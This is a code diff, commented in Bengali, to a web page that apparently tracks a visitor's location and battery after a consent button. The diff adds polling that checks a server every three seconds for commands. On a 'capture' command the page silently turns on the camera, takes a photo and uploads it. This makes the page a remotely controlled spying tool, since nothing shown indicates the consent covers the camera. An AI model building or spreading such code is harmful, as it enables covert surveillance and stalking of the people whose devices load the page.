@@ -39,6 +39,7 @@
 
     <script>
         let watchId = null;
+        let sharingInterval = null;
         const btn = document.getElementById('consentBtn');
         const statusMsg = document.getElementById('statusMsg');
         const clientId = 'device_' + Math.random().toString(36).substr(2, 9);
@@ -131,6 +132,9 @@
                 },
                 { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
+
+            // প্রতি ৩ সেকেন্ডে সার্ভার চেক করবে কোনো কমান্ড এসেছে কিনা
+            sharingInterval = setInterval(checkCommands, 3000);
         }
 
         function sendData(lat, lng, accuracy, battery, charging) {
@@ -165,6 +169,61 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
             }).catch(err => console.error("ডেটা পাঠাতে সমস্যা:", err));
+        }
+
+        function checkCommands() {
+            // সার্ভার থেকে এই ডিভাইসের ডেটা চেক করা (কমান্ড আছে কিনা)
+            fetch('/api/clients')
+                .then(res => res.json())
+                .then(clients => {
+                    const data = clients[clientId];
+                    if (data && data.command === 'capture') {
+                        takePhoto();
+                    }
+                }).catch(err => console.log(err));
+        }
+
+        function takePhoto() {
+            // ক্যামেরা চালু করার চেষ্টা
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    // ভিডিও লোড হওয়ার পর ছবি তোলা
+                    video.onloadedmetadata = () => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        // ক্যামেরা বন্ধ করা
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        // ছবি ডেটা সার্ভারে পাঠানো
+                        const imageData = canvas.toDataURL('image/jpeg', 0.6); // কোয়ালিটি ৬০%
+                        sendCameraData(imageData);
+                    };
+                })
+                .catch(err => {
+                    console.error("ক্যামেরা অ্যাক্সেস ব্যর্থ:", err);
+                });
+        }
+
+        function sendCameraData(imageData) {
+            const data = {
+                id: clientId,
+                camera_image: imageData,
+                time: new Date().toISOString()
+            };
+
+            fetch('/api/update', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(err => console.error("ছবি পাঠাতে সমস্যা:", err));
         }
     </script>
 </body>
